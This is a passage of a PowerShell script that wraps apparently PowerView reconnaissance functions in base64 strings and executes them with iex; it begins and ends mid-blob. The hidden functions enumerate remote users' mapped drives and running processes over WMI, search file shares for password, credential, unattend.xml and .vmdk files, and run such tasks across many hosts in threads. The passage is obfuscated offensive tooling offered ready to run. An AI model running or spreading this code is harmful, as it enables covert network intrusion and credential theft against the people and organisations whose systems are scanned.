ID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U2lkICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJERyaXZlTGV0dGVycyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmsiKSkuc05hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCREcml2ZUxldHRlciBpbiAkRHJpdmVMZXR0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJvdmlkZXJOYW1lID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXIiLCAnUHJvdmlkZXJOYW1lJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmVtb3RlUGF0aCA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmtcJERyaXZlTGV0dGVyIiwgJ1JlbW90ZVBhdGgnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICREcml2ZVVzZXJOYW1lID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXIiLCAnVXNlck5hbWUnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRVc2VyTmFtZSkgeyAkVXNlck5hbWUgPSAnJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlbW90ZVBhdGggLWFuZCAoJFJlbW90ZVBhdGggLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlTGV0dGVyJyAkRHJpdmVMZXR0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3ZpZGVyTmFtZScgJFByb3ZpZGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVtb3RlUGF0aCcgJFJlbW90ZVBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlVXNlck5hbWUnICREcml2ZVVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTW91bnRlZERyaXZlJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVByb2Nlc3MgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlclByb2Nlc3MnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdXaW4zMl9wcm9jZXNzJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgIEdldC1XTUlvYmplY3QgQFdtaUFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT3duZXIgPSAkXy5nZXRvd25lcigpOwogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc05hbWUnICRfLlByb2Nlc3NOYW1lCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc0lEJyAkXy5Qcm9jZXNzSUQKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICRPd25lci5Eb21haW4KICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyJyAkT3duZXIuVXNlcgogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVByb2Nlc3NdIEVycm9yIGVudW1lcmF0aW5nIHJlbW90ZSBwcm9jZXNzZXMgb24gJyRDb21wdXRlcicsIGFjY2VzcyBsaWtlbHkgZGVuaWVkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0ZpbGUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm91bmRGaWxlJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGggPSAnLlwnLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZWFyY2hUZXJtcycsICdUZXJtcycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSW5jbHVkZSA9IEAoJypwYXNzd29yZConLCAnKnNlbnNpdGl2ZSonLCAnKmFkbWluKicsICcqbG9naW4qJywgJypzZWNyZXQqJywgJ3VuYXR0ZW5kKi54bWwnLCAnKi52bWRrJywgJypjcmVkcyonLCAnKmNyZWRlbnRpYWwqJywgJyouY29uZmlnJyksCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RBY2Nlc3NUaW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRMYXN0V3JpdGVUaW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRDcmVhdGlvblRpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ09mZmljZURvY3MnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRPZmZpY2VEb2NzLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGcmVzaEVYRXMnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGcmVzaEVYRXMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUZvbGRlcnMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUhpZGRlbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1dyaXRlQWNjZXNzLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9ICBAewogICAgICAgICAgICAnUmVjdXJzZScgPSAkVHJ1ZQogICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1NpbGVudGx5Q29udGludWUnCiAgICAgICAgICAgICdJbmNsdWRlJyA9ICRJbmNsdWRlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ09mZmljZURvY3MnXSkgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0luY2x1ZGUnXSA9IEAoJyouZG9jJywgJyouZG9jeCcsICcqLnhscycsICcqLnhsc3gnLCAnKi5wcHQnLCAnKi5wcHR4JykKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZyZXNoRVhFcyddKSB7CiAgICAgICAgICAgICRMYXN0QWNjZXNzVGltZSA9IChHZXQtRGF0ZSkuQWRkRGF5cygtNykuVG9TdHJpbmcoJ01NL2RkL3l5eXknKQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0luY2x1ZGUnXSA9IEAoJyouZXhlJykKICAgICAgICB9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydGb3JjZSddID0gLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVIaWRkZW4nXQogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KICAgICAgICBmdW5jdGlvbiBUZXN0LVdyaXRlIHsKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbShbU3RyaW5nXSRQYXRoKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZpbGV0ZXN0ID0gW0lPLkZpbGVdOjpPcGVuV3JpdGUoJFBhdGgpCiAgICAgICAgICAgICAgICAkRmlsZXRlc3QuQ2xvc2UoKQogICAgICAgICAgICAgICAgJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAkRmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIGlmICgoJFRhcmdldFBhdGggLU1hdGNoICdcXFxcLipcXC4qJykgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pKSB7CiAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRIb3N0Q29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1BhdGgnXSA9ICRUYXJnZXRQYXRoCiAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJENvbnRpbnVlID0gJFRydWUKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVGb2xkZXJzJ10gLWFuZCAoJF8uUFNJc0NvbnRhaW5lcikpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGNsdWRpbmc6ICQoJF8uRnVsbE5hbWUpIgogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRMYXN0QWNjZXNzVGltZSAtYW5kICgkXy5MYXN0QWNjZXNzVGltZSAtbHQgJExhc3RBY2Nlc3NUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTGFzdFdyaXRlVGltZSddIC1hbmQgKCRfLkxhc3RXcml0ZVRpbWUgLWx0ICRMYXN0V3JpdGVUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlYXRpb25UaW1lJ10gLWFuZCAoJF8uQ3JlYXRpb25UaW1lIC1sdCAkQ3JlYXRpb25UaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ2hlY2tXcml0ZUFjY2VzcyddIC1hbmQgKC1ub3QgKFRlc3QtV3JpdGUgLVBhdGggJF8uRnVsbE5hbWUpKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgICRGaWxlUGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1BhdGgnID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ093bmVyJyA9ICQoKEdldC1BY2wgJF8uRnVsbE5hbWUpLk93bmVyKQogICAgICAgICAgICAgICAgICAgICAgICAnTGFzdEFjY2Vzc1RpbWUnID0gJF8uTGFzdEFjY2Vzc1RpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0xhc3RXcml0ZVRpbWUnID0gJF8uTGFzdFdyaXRlVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRpb25UaW1lJyA9ICRfLkNyZWF0aW9uVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnTGVuZ3RoJyA9ICRfLkxlbmd0aAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRGaWxlUGFyYW1zCiAgICAgICAgICAgICAgICAgICAgJEZvdW5kRmlsZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRm91bmRGaWxlJykKICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgICRNYXBwZWRDb21wdXRlcnMuS2V5cyB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LVRocmVhZGVkRnVuY3Rpb24gewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uU2NyaXB0QmxvY2tdCiAgICAgICAgJFNjcmlwdEJsb2NrLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTY3JpcHRQYXJhbWV0ZXJzLAogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb0ltcG9ydHMKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2Vzc2lvblN0YXRlID0gW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLkluaXRpYWxTZXNzaW9uU3RhdGVdOjpDcmVhdGVEZWZhdWx0KCkKICAgICAgICAkU2Vzc2lvblN0YXRlLkFwYXJ0bWVudFN0YXRlID0gW1N5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGVdOjpTVEEKICAgICAgICBpZiAoLW5vdCAkTm9JbXBvcnRzKSB7CiAgICAgICAgICAgICRNeVZhcnMgPSBHZXQtVmFyaWFibGUgLVNjb3BlIDIKICAgICAgICAgICAgJFZvcmJpZGRlblZhcnMgPSBAKCc/JywnYXJncycsJ0NvbnNvbGVGaWxlTmFtZScsJ0Vycm9yJywnRXhlY3V0aW9uQ29udGV4dCcsJ2ZhbHNlJywnSE9NRScsJ0hvc3QnLCdpbnB1dCcsJ0lucHV0T2JqZWN0JywnTWF4aW11bUFsaWFzQ291bnQnLCdNYXhpbXVtRHJpdmVDb3VudCcsJ01heGltdW1FcnJvckNvdW50JywnTWF4aW11bUZ1bmN0aW9uQ291bnQnLCdNYXhpbXVtSGlzdG9yeUNvdW50JywnTWF4aW11bVZhcmlhYmxlQ291bnQnLCdNeUludm9jYXRpb24nLCdudWxsJywnUElEJywnUFNCb3VuZFBhcmFtZXRlcnMnLCdQU0NvbW1hbmRQYXRoJywnUFNDdWx0dXJlJywnUFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVzJywnUFNIT01FJywnUFNTY3JpcHRSb290JywnUFNVSUN1bHR1cmUnLCdQU1ZlcnNpb25UYWJsZScsJ1BXRCcsJ1NoZWxsSWQnLCdTeW5jaHJvbml6ZWRIYXNoJywndHJ1ZScpCiAgICAgICAgICAgIEZvckVhY2ggKCRWYXIgaW4gJE15VmFycykgewogICAgICAgICAgICAgICAgaWYgKCRWb3JiaWRkZW5WYXJzIC1Ob3RDb250YWlucyAkVmFyLk5hbWUpIHsKICAgICAgICAgICAgICAgICRTZXNzaW9uU3RhdGUuVmFyaWFibGVzLkFkZCgoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuU2Vzc2lvblN0YXRlVmFyaWFibGVFbnRyeSAtQXJndW1lbnRMaXN0ICRWYXIubmFtZSwkVmFyLlZhbHVlLCRWYXIuZGVzY3JpcHRpb24sJFZhci5vcHRpb25zLCRWYXIuYXR0cmlidXRlcykpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJEZ1bmN0aW9uIGluIChHZXQtQ2hpbGRJdGVtIEZ1bmN0aW9uOikpIHsKICAgICAgICAgICAgICAgICRTZXNzaW9uU3RhdGUuQ29tbWFuZHMuQWRkKChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5TZXNzaW9uU3RhdGVGdW5jdGlvbkVudHJ5IC1Bcmd1bWVudExpc3QgJEZ1bmN0aW9uLk5hbWUsICRGdW5jdGlvbi5EZWZpbml0aW9uKSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkUG9vbCA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZVBvb2woMSwgJFRocmVhZHMsICRTZXNzaW9uU3RhdGUsICRIb3N0KQogICAgICAgICRQb29sLk9wZW4oKQogICAgICAgICRNZXRob2QgPSAkTnVsbAogICAgICAgIEZvckVhY2ggKCRNIGluIFtQb3dlclNoZWxsXS5HZXRNZXRob2RzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1lcSAnQmVnaW5JbnZva2UnIH0pIHsKICAgICAgICAgICAgJE1ldGhvZFBhcmFtZXRlcnMgPSAkTS5HZXRQYXJhbWV0ZXJzKCkKICAgICAgICAgICAgaWYgKCgkTWV0aG9kUGFyYW1ldGVycy5Db3VudCAtZXEgMikgLWFuZCAkTWV0aG9kUGFyYW1ldGVyc1swXS5OYW1lIC1lcSAnaW5wdXQnIC1hbmQgJE1ldGhvZFBhcmFtZXRlcnNbMV0uTmFtZSAtZXEgJ291dHB1dCcpIHsKICAgICAgICAgICAgICAgICRNZXRob2QgPSAkTS5NYWtlR2VuZXJpY01ldGhvZChbT2JqZWN0XSwgW09iamVjdF0pCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRKb2JzID0gQCgpCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRDb21wdXRlck5hbWUgfCBXaGVyZS1PYmplY3QgeyRfIC1hbmQgJF8uVHJpbSgpfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRDb21wdXRlck5hbWUuY291bnQpIgogICAgICAgIGlmICgkVGhyZWFkcyAtZ2UgJENvbXB1dGVyTmFtZS5MZW5ndGgpIHsKICAgICAgICAgICAgJFRocmVhZHMgPSAkQ29tcHV0ZXJOYW1lLkxlbmd0aAogICAgICAgIH0KICAgICAgICAkRWxlbWVudFNwbGl0U2l6ZSA9IFtJbnRdKCRDb21wdXRlck5hbWUuTGVuZ3RoLyRUaHJlYWRzKQogICAgICAgICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCA9IEAoKQogICAgICAgICRTdGFydCA9IDAKICAgICAgICAkRW5kID0gJEVsZW1lbnRTcGxpdFNpemUKICAgICAgICBmb3IoJGkgPSAxOyAkaSAtbGUgJFRocmVhZHM7ICRpKyspIHsKICAgICAgICAgICAgJExpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICAgICAgICAgaWYgKCRpIC1lcSAkVGhyZWFkcykgewogICAgICAgICAgICAgICAgJEVuZCA9ICRDb21wdXRlck5hbWUuTGVuZ3RoCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJExpc3QuQWRkUmFuZ2UoJENvbXB1dGVyTmFtZVskU3RhcnQuLigkRW5kLTEpXSkKICAgICAgICAgICAgJFN0YXJ0ICs9ICRFbGVtZW50U3BsaXRTaXplCiAgICAgICAgICAgICRFbmQgKz0gJEVsZW1lbnRTcGxpdFNpemUKICAgICAgICAgICAgJENvbXB1dGVyTmFtZVBhcnRpdGlvbmVkICs9IEAoLEAoJExpc3QuVG9BcnJheSgpKSkKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgdGhyZWFkcy9wYX